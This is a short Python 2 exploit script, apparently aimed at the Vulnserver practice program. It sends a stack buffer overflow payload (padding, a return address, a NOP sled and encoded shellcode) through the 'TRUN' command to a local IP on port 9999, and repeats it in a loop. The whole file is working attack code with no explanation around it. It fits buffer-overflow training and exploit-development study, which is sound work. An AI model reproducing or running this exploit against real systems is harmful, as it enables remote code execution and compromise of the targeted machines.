#!/usr/bin/python
import socket, sys

overflow = ( "\xd9\xec\xd9\x74\x24\xf4\xbb\x06\x1a\xb9\x9a\x5a\x31\xc9\xb1"
"\x52\x31\x5a\x17\x03\x5a\x17\x83\xc4\x1e\x5b\x6f\x34\xf6\x19"
"\x90\xc4\x07\x7e\x18\x21\x36\xbe\x7e\x22\x69\x0e\xf4\x66\x86"
"\xe5\x58\x92\x1d\x8b\x74\x95\x96\x26\xa3\x98\x27\x1a\x97\xbb"
"\xab\x61\xc4\x1b\x95\xa9\x19\x5a\xd2\xd4\xd0\x0e\x8b\x93\x47"
"\xbe\xb8\xee\x5b\x35\xf2\xff\xdb\xaa\x43\x01\xcd\x7d\xdf\x58"
"\xcd\x7c\x0c\xd1\x44\x66\x51\xdc\x1f\x1d\xa1\xaa\xa1\xf7\xfb"
"\x53\x0d\x36\x34\xa6\x4f\x7f\xf3\x59\x3a\x89\x07\xe7\x3d\x4e"
"\x75\x33\xcb\x54\xdd\xb0\x6b\xb0\xdf\x15\xed\x33\xd3\xd2\x79"
"\x1b\xf0\xe5\xae\x10\x0c\x6d\x51\xf6\x84\x35\x76\xd2\xcd\xee"
"\x17\x43\xa8\x41\x27\x93\x13\x3d\x8d\xd8\xbe\x2a\xbc\x83\xd6"
"\x9f\x8d\x3b\x27\x88\x86\x48\x15\x17\x3d\xc6\x15\xd0\x9b\x11"
"\x59\xcb\x5c\x8d\xa4\xf4\x9c\x84\x62\xa0\xcc\xbe\x43\xc9\x86"
"\x3e\x6b\x1c\x08\x6e\xc3\xcf\xe9\xde\xa3\xbf\x81\x34\x2c\x9f"
"\xb2\x37\xe6\x88\x59\xc2\x61\x77\x35\xcd\x77\x1f\x44\xcd\x66"
"\x83\xc1\x2b\xe2\x2b\x84\xe4\x9b\xd2\x8d\x7e\x3d\x1a\x18\xfb"
"\x7d\x90\xaf\xfc\x30\x51\xc5\xee\xa5\x91\x90\x4c\x63\xad\x0e"
"\xf8\xef\x3c\xd5\xf8\x66\x5d\x42\xaf\x2f\x93\x9b\x25\xc2\x8a"
"\x35\x5b\x1f\x4a\x7d\xdf\xc4\xaf\x80\xde\x89\x94\xa6\xf0\x57"
"\x14\xe3\xa4\x07\x43\xbd\x12\xee\x3d\x0f\xcc\xb8\x92\xd9\x98"
"\x3d\xd9\xd9\xde\x41\x34\xac\x3e\xf3\xe1\xe9\x41\x3c\x66\xfe"
"\x3a\x20\x16\x01\x91\xe0\x36\xe0\x33\x1d\xdf\xbd\xd6\x9c\x82"
"\x3d\x0d\xe2\xba\xbd\xa7\x9b\x38\xdd\xc2\x9e\x05\x59\x3f\xd3"
"\x16\x0c\x3f\x40\x16\x05")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.1.95', 9999))
	        s.send(('TRUN /.:/' + shellcode))
                s.close()
        except:
                print "Error connecting to server"
                sys.exit()
